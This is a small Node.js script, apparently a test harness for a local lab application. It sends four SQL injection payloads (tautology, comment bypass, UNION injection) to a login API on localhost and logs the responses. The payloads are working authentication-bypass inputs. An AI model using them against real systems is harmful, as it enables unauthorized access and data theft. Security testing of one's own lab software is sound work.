const http = require('http');
const payloads = [
  { name: 'Boolean bypass', username: "admin' OR '1'='1", password: 'anything' },
  { name: 'Comment bypass', username: "admin' -- ", password: 'anything' },
  { name: 'Union data leak', username: "nonexistent' UNION SELECT 99,'injected','pwd','injected@cybersec.lab','admin' -- ", password: 'anything' },
  { name: 'Leading-quote tautology', username: "' OR '1'='1' -- ", password: 'anything' }
];

function run(payload, cb) {
  const data = JSON.stringify({ username: payload.username, password: payload.password });
  const opts = {
    hostname: 'localhost',
    port: 5000,
    path: '/api/auth/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data)
    }
  };

  const req = http.request(opts, (res) => {
    let body = '';
    res.on('data', (c) => body += c);
    res.on('end', () => cb(null, res.statusCode, body));
  });
  req.on('error', (err) => cb(err));
  req.write(data);
  req.end();
}

(async () => {
  for (const p of payloads) {
    console.log('\n----', p.name, '----');
    await new Promise((resolve) => {
      run(p, (err, code, body) => {
        if (err) console.error('ERROR', err);
        else {
          console.log('STATUS', code);
          try { console.log('BODY', JSON.parse(body)); }
          catch (e) { console.log('BODY', body); }
        }
        resolve();
      });
    });
  }
})();
